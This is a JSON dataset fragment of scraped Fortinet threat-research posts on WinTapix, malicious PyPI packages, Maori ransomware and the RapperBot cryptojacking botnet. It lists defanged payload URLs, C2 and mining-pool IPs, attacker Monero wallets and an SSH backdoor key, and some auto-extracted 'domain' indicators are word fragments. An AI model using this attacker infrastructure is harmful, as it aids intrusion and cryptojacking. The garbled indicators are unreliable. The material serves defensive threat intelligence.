Injected Shellcode aae9c8bd9db4e0d48e35d9ab3b1a8c7933284dcbeb344809fed18349a9ec7407 . Net payload 27a6c3f5c50c8813ca34ab3b0791c08817c803877665774954890884842973ed The following MITRE ATT&CK overlay contains TTPs associated with the deployment, installation and execution of the WinTapix driver and assocaited backdoor identified by FortiGuard Labs. In this section we are releasing the attack flow of Wintapix driver. The attack flow shows the actions that have been executed by this Driver based on Mitre TTPs. Attack Flowis a language that explains how threat actors combine and sequence various techniques and toolsets to accomplish their objectives. This language can help defenders to move from tracking individual adversary behaviors to monitoring the series of actions that adversaries utilize to achieve their objectives. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/wintapix-kernal-driver-middle-east-countries",
      "scraped_at": "2025-07-20T13:56:39.463860",
      "indicators": {
        "ip_address": [],
        "domain": [
          "intapix",
          "rocess",
          "inTapix"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "f6c316e2385f2694d47e936b0ac4bc9b55e279d530dd5e805f0d963cb47c3c0d",
          "aae9c8bd9db4e0d48e35d9ab3b1a8c7933284dcbeb344809fed18349a9ec7407",
          "1485c0ed3e875cbdfc6786a5bd26d18ea9d31727deb8df290a1c00c780419a4e",
          "8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330",
          "27a6c3f5c50c8813ca34ab3b0791c08817c803877665774954890884842973ed"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2448979591836735
    }
  },
  {
    "id": "Fortinet_27681",
    "source": "Fortinet",
    "title": "More Supply Chain Attacks via Malicious Python Packages",
    "text": "FortiGuard Labs Threat Research The FortiGuard Labs team discovered over 30 new zero-day attacks in PyPI packages (Python Package Index). These were found between late March and late April by monitoring an open-source ecosystem. In this blog, we will cover all the packages that were found, grouping them into similar attacks or behavior. Some of these sets may have been shown in aprevious blog. 1. The packages in the following set were found to be similar: As explained in our last blog, the setup.py file in these packages tries to execute a Python script written to connect to a URL that may contain malicious code. 2. The next set of packages includes: The setup.py file in these packages tries to steal information, such as credit cards, wallets, account logins, etc. using a Discord webhook. 3. This set includes the following package: The setup.py file in this package tries to download a zip file to a directory (depending on the Python version), extract its contents, run a script contained in the zip file, and then remove its directory. 4. This set includes the following package: The setup.py file in this package connects to a URL to download and run a potentially malicious script. 5. This set includes the following package: Its setup.py file tries to execute the encoded data shown in Figure 5. The decoded data (shown below) tries to connect to a URL to write potentially malicious data to a Python script, which it then runs. It then removes the script. 6. The packages in this set include: Similar to set two, these packages tr yto steal sensitive information such as wallets, login information, cookies, etc., using a webhook. Its code includes a GitHub link tohttps://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook, indicating that it may be a BlackCap webhook stealer. It also includes additional features, such as bypassing VM machines, hiding itself, and injection techniques, etc. This time, the malicious code is found in __init__.py 7. Package seven includes: When examining its setup.py, we found that it tries to run the encoded data shown below. Once decoded, we see that it creates and runs an executable file that accesses and exfiltrates sensitive data. 8. This set includes the following package: This package’s setup.py file reveals the execution of encoded data, as shown in Figure 11. Once decoded (Figure 12), we see that it tries to retrieve potentially malicious data—most likely an executable from a URL—to write to a file, which it then tries to run. 9. This set includes the following package: This package contains multiple layers of obfuscation in its setup.py file, as shown in Figure 12. While it could not fully run, it still dropped a script named ‘WindowsDefender.py,’ which provides clues that it will execute a potentially malicious script that it retrieved from a file-sharing website, as shown in Figure 13. As this blog shows, we are seeing more—and more different—types of malicious Python packages being loaded into an open-source ecosystem, each with a unique method of attack. Given the increasing number and variety of attacks, end users should keep an eye out for suspicious packages and take caution before using them. We will continue to report current information on malicious packages to help users avoid becoming a victim of a supply chain attack. Fortiguard AntiVirus detects the malicious files identified in this report as tls-bypass-1.0 setup.py:Python/Agent. QD!tr zproxy-1.0 setup.py:Python/Agent. QD!tr ailzyn1tr0-1.0 setup.py:Python/Agent. QD!tr stripe-client-1.0 setup.py:Python/Agent. QD!tr stripepy-1.0 setup.py:Python/Agent. QD!tr proxycpz-1.0 setup.py: Python/Agent. QD!tr pycolorstrex-1.0 setup.py:Python/Agent. QD!tr pyproxyx-1.0 setup.py:Python/Agent. QD!tr colored-fidget-1.0 setup.py:Python/Agent. QD!tr async-box-1.4.7 setup.py:Python/Agent. QD!tr seleniumunclickable-1.0.1 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.0 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.1 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.2 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.3 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.4 setup.py:Python/Agent. QD!tr pyobfexecute-1.0.5 setup.py:Python/Agent. QD!tr compilecls-1.0.2 __init__.py:Python/Agent. QD!tr compilecls-1.0.3 __init__.py:Python/Agent. QD!tr randgenlib-1.0.2 __init__.py:Python/Agent. QD!tr aietelegram-0.3 setup.py:Python/Agent. QD!tr pipcoloringlibary-1.0.0 __init__.py:Python/Agent. QD!tr social-scrapper-3.6 setup.py:Python/Agent. QD!tr quick-telegram-sender-0.7 setup.py:Python/Agent. QD!tr oauth20-api-1.0 setup.py:Python/Agent. KAF libidreq-0.1 setup.py:Python/Agent. QD!tr roblopython-2.0.15 setup.py:Python/Agent. QD!tr setnetwork-0.3 setup.py:Python/Agent. QD!tr pycalculate-1.0.0 setup.py:Python/Agent. QD!tr pipcoloringliberyV2-1.0.0 __init__.py:Python/Agent. QD!tr pythoncolourlibraryV1-1.0.0 __init__.py:Python/Agent. QD!tr tg-bulk-sender-2.3 setup.py:Python/Agent. QD!tr social-scrappers-2.3 setup.py:Python/Agent. QD!tr tiktok-phone-cheker-2.42 setup.py:Python/Agent. QD!tr bogdi-1.0 setup.py:Python/Agent. KAF cloud-client-1.34 setup.py:Python/Agent. QD!tr cloudfix-0.0.0 setup.py:Python/Agent. QD!tr cloudfix-2 setup.py:Python/Agent. QD!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. tls-bypass-1.0 setup.py ffb2b2e714229f281add91aca0d57dcf zproxy-1.0 setup.py d4c635f97b6564b904803fc2aabbaed8 ailzyn1tr0-1.0 setup.py 89db7b4665cff163931777f091f3b8f5 stripe-client-1.0 setup.py 9b4d4447926c285f0b61cda94cd4c091 stripepy-1.0 setup.py 3330f0addf70da913f2612a1f4160966 proxycpz-1.0 setup.py 2377e6a74e114629130519fb11307c1e pycolorstrex-1.0 setup.py b916f12792f9fa268151a62fd251f5ba pyproxyx-1.0 setup.py 67bd8ac1e0dbfc1e97dcf3484dc94962 colored-fidget-1.0 setup.py 8185f8b26899dc1a3fb21f28a707d416 async-box-1.4.7 setup.py 6bf677c885d35e60469a03a5fbdf9d05 seleniumunclickable-1.0.1 setup.py ef8c25e9f2898b3e4d6ae90c8f3326bb pyobfexecute-1.0.0 setup.py 0c7ef9ff1aa6063b2c05d7b6a90ac9e8 pyobfexecute-1.0.1 setup.py 3ba67a5955c66e272ce9c0dc7899a303 pyobfexecute-1.0.2 setup.py 3a52b545ec52c2690b3b3360e6aeabea pyobfexecute-1.0.3 setup.py f7c4e2d0af6729d90490bed9ec5529bb pyobfexecute-1.0.4 setup.py fb61ab7fedb684c5cc911f34e7694b97 pyobfexecute-1.0.5 setup.py 0e254a2fe5f2b45e8d46473e1bf4261e compilecls-1.0.2 __init__.py f35ceed9535442d8c54ae2c812981967 compilecls-1.0.3 __init__.py 531c8cfcb06f317e3d2d6f5244065d0e randgenlib-1.0.2 __init__.py 72e54b41d47187beed081a19f5f492e9 aietelegram-0.3 setup.py 31fc1f95991734c9b6934aa76ea0937f pipcoloringlibary-1.0.0 __init__.py 53ba97516240b344513be0ebf7bfac12 social-scrapper-3.6 setup.py 51e2facc49ca409cb39388e97231db48 quick-telegram-sender-0.7 setup.py cf247e4436d2d44a4f426447fa125de6 oauth20-api-1.0 setup.py 73e623a5ed9e8f55131c2e00e9660e8b libidreq-0.1 setup.py 31e30f8f40e0f917007a0771b3c671e2 roblopython-2.0.15 setup.py fcc64a48b6182a22952cc237d99d9350 setnetwork-0.3 setup.py 9fa65e48a699f1540c8423844ae0da9f pycalculate-1.0.0 setup.py faf2d569cdaf4e1337d7be27b148e72d pipcoloringliberyV2-1.0.0 __init__.py 53ba97516240b344513be0ebf7bfac12 pythoncolourlibraryV1-1.0.0 __init__.py df46d8d238eee6e283775ba3be6e73bf tg-bulk-sender-2.3 setup.py 047b511c33587734c658146e7802bd01 social-scrappers-2.3 setup.py 0d5a0e3a2ff4d0e216eeac4068a80a79 tiktok-phone-cheker-2.42 setup.py 9e060f032e7b4df22cd0bf3e2402e068 bogdi-1.0 setup.py 84285525a2ab835d5200daedc331242a cloud-client-1.34 setup.py 350639460f29536d7e92e7e9616f5927 cloudfix-0.0.0 setup.py d7296063bbd8eefa39897972530db644 cloudfix-2 setup.py 3d551ad49ad93382a33abe57da0d33c5 Malicious URLs hxxps://paste[.]website/p/400c3e4b-a59b-4598-a199-75e848aeaae3[.]txt hxxps://raw[.]githubusercontent[.]com/KSCHdsc/BlackCap-Inject/main/index[.]js python,zero-day FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-malicious-python-packages",
      "scraped_at": "2025-07-20T13:56:48.029014",
      "indicators": {
        "ip_address": [],
        "domain": [
          "etup",
          "indowsDefender",
          "ithub"
        ],
        "hash_md5": [
          "df46d8d238eee6e283775ba3be6e73bf",
          "3330f0addf70da913f2612a1f4160966",
          "531c8cfcb06f317e3d2d6f5244065d0e",
          "84285525a2ab835d5200daedc331242a",
          "2377e6a74e114629130519fb11307c1e",
          "9fa65e48a699f1540c8423844ae0da9f",
          "f7c4e2d0af6729d90490bed9ec5529bb",
          "faf2d569cdaf4e1337d7be27b148e72d",
          "9b4d4447926c285f0b61cda94cd4c091",
          "0c7ef9ff1aa6063b2c05d7b6a90ac9e8",
          "31fc1f95991734c9b6934aa76ea0937f",
          "8185f8b26899dc1a3fb21f28a707d416",
          "0e254a2fe5f2b45e8d46473e1bf4261e",
          "fb61ab7fedb684c5cc911f34e7694b97",
          "0d5a0e3a2ff4d0e216eeac4068a80a79",
          "73e623a5ed9e8f55131c2e00e9660e8b",
          "31e30f8f40e0f917007a0771b3c671e2",
          "72e54b41d47187beed081a19f5f492e9",
          "67bd8ac1e0dbfc1e97dcf3484dc94962",
          "ef8c25e9f2898b3e4d6ae90c8f3326bb",
          "3a52b545ec52c2690b3b3360e6aeabea",
          "350639460f29536d7e92e7e9616f5927",
          "9e060f032e7b4df22cd0bf3e2402e068",
          "6bf677c885d35e60469a03a5fbdf9d05",
          "53ba97516240b344513be0ebf7bfac12",
          "ffb2b2e714229f281add91aca0d57dcf",
          "f35ceed9535442d8c54ae2c812981967",
          "047b511c33587734c658146e7802bd01",
          "d4c635f97b6564b904803fc2aabbaed8",
          "cf247e4436d2d44a4f426447fa125de6",
          "b916f12792f9fa268151a62fd251f5ba",
          "d7296063bbd8eefa39897972530db644",
          "3d551ad49ad93382a33abe57da0d33c5",
          "fcc64a48b6182a22952cc237d99d9350",
          "51e2facc49ca409cb39388e97231db48",
          "89db7b4665cff163931777f091f3b8f5",
          "3ba67a5955c66e272ce9c0dc7899a303"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "https://github.com/Inplex"
        ]
      },
      "threat_score": 1.0300925925925926
    }
  },
  {
    "id": "Fortinet_90494",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Maori",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Maori ransomware. Affected platforms:LinuxImpacted parties:Linux UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called Maori. Like other ransomware variants, it encrypts files on victims’ machines to extort money. Interestingly, this variant is designed to run on Linux architecture and is coded in Go, which is somewhat rare and increases the analysis difficulty. Infection Vector Information on the infection vector used by the Maori ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Maori is widespread. Ransomware Execution Maori targets all user files in their home directory (Linux; “/home/<username>”). It ignores files placed elsewhere (including those just in the “/home/” directory as well as in other Linux system directories, like “/”). Due to this narrow objective, it accomplishes its job very quickly. Upon completion, the Maori executable deletes itself from the victim machine. All affected files are appended with a “.maori” extension, and a “README_MAORI.txt” file is dropped into each directory with encrypted files. The entire contents of each affected file are encrypted, rather than just enough of the contents to render them unusable. As a result, files end up slightly larger than the original, as seen in the size differences between Figures 1 and 2. As mentioned, a ransom note is deposited into each directory that has had its files encrypted. The note asks the victim to contact them using Tox (a peer-to-peer, end-to-end encrypted messenger application). It also provides an onionmail e-mail address as a backup communication method and unique strings for both to provide as identification to the Maori operators. No monetary sum is listed as a ransom amount. Fortinet Protections Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Maori ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: a5ed581ad5cd1a2f29473cb56116cd179bfe61a924969b2dedbe07660eef9bc5 Maori ransomware FortiGuard Labs Guidance Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-maori",
      "scraped_at": "2025-07-20T13:56:54.935686",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "a5ed581ad5cd1a2f29473cb56116cd179bfe61a924969b2dedbe07660eef9bc5"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4288939051918737
    }
  },
  {
    "id": "Fortinet_66167",
    "source": "Fortinet",
    "title": "RapperBot DDoS Botnet Expands into Cryptojacking",
    "text": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical FortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs reported on its previous campaigns inAugust 2022andDecember 2022. Those campaigns focused on brute-forcing devices with weak or default SSH or Telnet credentials to expand the botnet’s footprint for launchingDistributed Denial of Service(DDoS) attacks. In this campaign, these threat actors have started venturing intocryptojacking, specifically for Intel x64 machines. Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in late January 2023, they combined both functionalities into a single bot. This article will discuss the changes observed in this new campaign and provide a technical analysis of the RapperBot variant upgraded with miner capabilities. We began observing the first samples of this RapperBot miner campaign in January 2023. They share some characteristics that allowed us to link this campaign to the earlier ones. The most unique and enduring trait of RapperBot samples is the YouTube URLhttps://www.youtube.com/watch?v=4fm_ZZn5qaw, which has been seen in most samples from this family. However, the string is never actually used in this campaign, unlike older samples where it prints the URL to the console at the start of execution. Another indicator of a RapperBot campaign is adding an SSH public key to~/.ssh/authorized_keysto maintain backdoor access to infected machines, even after the devices have been rebooted. This latest campaign uses the same key observed in the first campaign in June 2022 and is listed in the IOC section below. Beyond these similarities, however, we also observed some key differences, including several significant updates to the malware functionality, particularly in its C2 communication protocol. One cluster of ARM samples, suchas 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f(Cluster A) that were delivered viahxxp://109[.]206[.]243[.]207/ssh/arm7,were very minimal in functionality. They only included three DoS attack types and no SSH brute forcing or self-propagation abilities. However, these samples included new code to collect and send information about the infected system upon registering with the C2 server. Another cluster of ARM samples delivered from the same URL, such as912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65(Cluster B), resembles the above samples but with the inclusion of the SSH brute-forcer last seen in the June 2022 campaign. Unlike that campaign, credentials are embedded in each sample and not downloaded from the C2 server. These samples propagate themselves by downloading and executing hxxp://109[.]206[.]243[.]207/d upon the successful brute force breach of a system. As in past campaigns, all samples from this campaign still encode sensitive strings with XOR encoding. But this time, the developers have opted to add an extra layer of XOR encoding, with the first layer using multi-byte XOR keys with different values and lengths for each encoded string. The second layer uses the same style of single-byte XOR encoding as in previous campaigns, with the key calculated by XORing all bytes of the first layer key (Figure 1). This additional layer of XOR encoding prevents XOR brute forcing and the easy detection of malware-related strings. The original draft was worded ambiguously, we meant to say that this campaign embedded the credentials in each sample. In the previous campaign, the credentials were downloaded from the C2 server. The structure of client requests to the Command-and-Control (C2) server has also been significantly updated. The unique 32-byte Bot ID sent with every request in previous campaigns has been removed. Instead, the request size is now variable, with random bytes generated to fill the unused parts of the request. Lastly, the request data is no longer located at fixed offsets within each request. We describe the communication protocol and request structure in more detail below. Upon execution, RapperBot connects to a hardcoded C2 server and sends a registration request (type1) containing information about the victim system (Figure 2): 1. Hardcoded value: 0x3 0xd3 0x4a 0xb6 2. Source: This is the first command line argument passed to the malware and usually indicates the infection vector (e.g., scan.ssh.x86_64) 3. Local IP address 4. UID (User identifier) 5. Current working directory 6. Number of processors 7. Total memory size 8. Open File Limit 9. Hostname 10. Processor model After that, it sends a keep-alive request (type3) to inform the C2 server that it is ready to receive commands. The malware then performs this request at random intervals of 60 to 600 seconds. To evade detection, the binary network protocol used to send these requests has been completely revised. Like its string encoding, it uses a two-layer approach to encode the information sent to the C2 server. The header data must first be decoded to reveal the location of the encoded information and the key needed to decode it. The size of each request is randomized, so shorter requests do not stand out in network traffic. The malware starts by generating a random number between 4 and 128, which we will refer to as RAND_VALUE, and a random XOR key for the content from 4 to 32 bytes long (referred to as KEY_SIZE). The request size is then calculated as follows: REQUEST_SIZE = RAND_VALUE + KEY_SIZE + CONTENT_SIZE + 6 The malware then generates a buffer of the same size and fills it with random bytes. The first byte of this buffer will be used as a XOR key (HEADER_KEY) for encoding the header data. The second byte will be overwritten with the RAND_VALUE XORed with the HEADER_KEY. The request data is stored at HEADER_OFFSET, RAND_VALUE / 2. The format of the structure starting at HEADER_OFFSET is as follows: All non-highlighted bytes in Figure 3 are unused padding bytes generated randomly by the malware. The Python code used to decode the content in each request with the HEADER_KEY and KEY is shown below: While we did not receive commands from the C2 server, our analysis shows that the bot supports the following commands with their corresponding IDs. The change in the C2 communication protocol is not the only major update in this campaign. Until now, RapperBot has been primarily geared toward using its victims for DDoS operations. For this campaign, however, it has started to venture into abusing the resources of infected Intel x64 machines to mine for cryptocurrency, commonly known as Cryptojacking. We observed thathxxp://109[.]206[.]243[.]207/ssh/x86_64started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash:7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash:0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4. XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 samplef06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa,which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Apart from executing the miner as a child process upon execution, these samples are functionally identical to those targeting ARM devices and do not have SSH brute-forcing or self-replication capabilities. Merging the bot and miner code might be an attempt to hide the mining pools and Monero wallet addresses (listed in the IOCs section) using the same double-layer XOR encoding so they are not exposed in the clear, as in the Bash script (Figure 4). The miner code also contains several modifications to facilitate cryptojacking. The ability to read external configuration files has been removed, so it always uses the configuration built into the binary itself. The bot decodes the mining pools and Monero wallet addresses and updates the hardcoded configuration before starting the embedded miner. The miner is also configured to use multiple mining pools for both redundancy and additional privacy. Two of them are mining proxies hosted on the RapperBot C2 IP itself. This allows the threat actor to omit both the wallet addresses and actual mining pools from the miner configuration. Additionally, they can change this information on the proxy server without rebuilding and deploying new bots. Aside from this, it is also configured to directly use a public mining pool, likely as a backup if the C2 IP goes offline. To prevent the termination of the miner process by the machine owner, the default signal handlers for SIGTERM, SIGUSR1, SIGINT, and SIGHUP signals have been removed. The usage information printed when executing the--helpcommand line argument has also been removed, likely to evade detection by security products and competing miners from other cryptojacking groups. Likewise, the developers also replaced “XMRig\" with “asbuasdbu\" in the version information to prevent easy identification. To maximize mining efficiency, it kills off other miners by enumerating other running processes and attempts to scan the associated binaries on disk for the following blacklisted keywords. These processes are then terminated, and the corresponding files are deleted. For example, “--algo” in the list below is part of the usage information printed by standard XMRig miners. If the binaries are not readable, it will look for blacklisted keywords within the file paths, terminate the processes, and delete the associated files. Lastly, it will terminate processes containing the blacklisted keywords in the process path or its command line arguments. Processes with path or command-line arguments containing “/zvx/” are whitelisted and never terminated. Based on the keywords used, the bot developers are more interested in terminating other miners than other IoT bots. This reaffirms their focus on cryptojacking vs DDoS attacks, at least on x64 machines. As a side note, we have not discovered an infection vector that directly delivers x64 RapperBot, as none of the RapperBot samples with an integrated miner appear to have self-propagation capabilities. This suggests the possible availability of an external loader operated by the threat actor that abuses the credentials collected by other RapperBot samples with brute forcing capabilities and infects only x64 machines with the combined bot/miner. Alternatively, the addition of the threat actor’s public SSH key in infected machines might provide another point of entry for these x64 samples. Financially motivated botnet operators are always on the lookout to extract the maximum value from machines infected by their botnets. The threat actors behind the RapperBot botnet are no exception, as evident in their addition of cryptojacking capabilities to target x64 machines. RapperBot continues to be a dangerous threat due to its continual updates to evade detection, as highlighted above. As its primary infection vector of compromising SSH services using weak or default passwords remains the same, mitigating it by enabling public key authentication or setting strong passwords for all devices connected to the internet is still effective in mitigating this threat. FortiGuard Labs will continue to monitor and report on RapperBot’s development. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors,CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f 912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65 f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa 6c034ff9b5447da62822e3231e5e2d5db225756b3e216f6fc469469cb1d81813 dfaffe78b8ccb03626c2f55596f977da917e8e9a00ee7576ce9eca688d88447d 95aa6882f5ea5a892ef832ef15dea77261394a7fec6db9d91267d40f1cf2bfa5 XMRig miner 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404 Bash scripts bd87ac780e574ae8415907f88a3b48af578bb269308b56826e2f33438559e4b7 3296598c79748322dfff8eb786705d048725c04b23dd3a293f52a1acafe9e7ae 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f Download URLs hxxp://109[.]206[.]243[.]207/d hxxp://109[.]206[.]243[.]207/ssh/arm4 hxxp://109[.]206[.]243[.]207/ssh/arm5 hxxp://109[.]206[.]243[.]207/ssh/arm6 hxxp://109[.]206[.]243[.]207/ssh/arm7 hxxp://109[.]206[.]243[.]207/ssh/bot hxxp://109[.]206[.]243[.]207/ssh/scan_arm4 hxxp://109[.]206[.]243[.]207/ssh/scan_arm5 hxxp://109[.]206[.]243[.]207/ssh/scan_arm6 hxxp://109[.]206[.]243[.]207/ssh/scan_arm7 hxxp://109[.]206[.]243[.]207/ssh/x86_64 hxxp://109[.]206[.]243[.]207/ssh/xmrig hxxp://171[.]22[.]136[.]15/arm4 hxxp://171[.]22[.]136[.]15/arm5 hxxp://171[.]22[.]136[.]15/arm6 hxxp://171[.]22[.]136[.]15/arm7 109[.]206[.]243[.]207 171[.]22[.]136[.]15 Mining Pools 109[.]206[.]243[.]207:31271 109[.]206[.]243[.]207:25621 pool[.]hashvault[.]pro:80 Monero Wallets 43Zs6jyniktVUNfiN8NY16TrvFKWbx3qogoRvstuquZdVA8EXvhqhz1W4hUzpjQXHAf3pDQ8UXxegFh8G26uCycKPz41ceW 47RupsxSjeHb4sHMwJ681vbjpFHAwXg6kMn1znbioqy96Qj9j2VuHrD2mXsEReELEdjRsDVKBK3Ru3diW3AgZ41Z7mzDwb4 AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPuVqHeFYDg05KweYqTqThFFHbdxdqqrWy6fNt8q/cgI30NBa5W2LyZ4b1v6324IEJuxImARIxTc96Igaf30LUza8kbZyc3bewY6IsFUN1PjQJcJi0ubVLyWyyJ554Tv8BBfPdY4jqCr4PzaJ2Rc1JFJYUSVVT4yX2p7L6iRpW212eZmqLMSoR5a2a/tO2s1giIlb+0EHtFWc2QH7yz/ZBjnun7opIoslLVvYJ9cxMoLeLr5Ig+zny+IEA3x090xtcL62X0jea6btVnYo7UN2BARziisZze6oVuOTCBijuyvOM6ROZ6s/wl4CQAOSLDeFIP5L1paP9V1XLaYLDBAodNaUPFfTxggH3tZrnnU8Dge5/1JNa08F3WNUPM1S1x8L2HMatwc82x35jXyBSp3AMbdxMPhvyYI8v2J1PqJH8OqGTVjdWe40mD2osRgLo1EOfP/SFBTD5VEo95K2ZLQ== system key generated by server 20220709 RapperBot,cryptojacking FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/rapperbot-ddos-botnet-expands-into-cryptojacking",
      "scraped_at": "2025-07-20T13:57:01.616036",
      "indicators": {
        "ip_address": [],
        "domain": [
          "can",
          "ww"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "dfaffe78b8ccb03626c2f55596f977da917e8e9a00ee7576ce9eca688d88447d",
          "7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f",
